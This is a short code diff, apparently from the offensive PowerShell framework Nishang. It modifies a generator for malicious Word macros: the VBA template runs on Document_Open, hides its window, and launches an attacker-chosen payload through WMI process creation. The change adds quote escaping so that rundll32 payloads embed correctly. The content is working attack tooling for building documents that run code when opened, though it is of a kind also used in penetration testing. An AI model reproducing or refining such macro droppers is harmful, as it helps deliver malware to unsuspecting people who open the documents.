@@ -309,14 +309,15 @@ https://github.com/samratashok/nishang
                 Set objConfig = objStartup.SpawnInstance_
                 objConfig.ShowWindow = HIDDEN_WINDOW
                 Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-                objProcess.Create $FinalPayload, Null, objConfig, intProcessID
+                objProcess.Create "$FinalPayload", Null, objConfig, intProcessID
              End Function
 "@
     }
     #If the payload is small in size, there is no need of multiline macro.
     else
     {
-        
+        # Escape double quotes. Useful for rundll32 payloads where double quotes are used. 
+        $FinalPayload = $Payload -replace '"','""'
         $code_one = @"
         Sub Document_Open()
         Execute
@@ -333,7 +334,7 @@ https://github.com/samratashok/nishang
                 Set objConfig = objStartup.SpawnInstance_
                 objConfig.ShowWindow = HIDDEN_WINDOW
                 Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-                objProcess.Create "$Payload", Null, objConfig, intProcessID
+                objProcess.Create "$FinalPayload", Null, objConfig, intProcessID
              End Function
 "@
     }
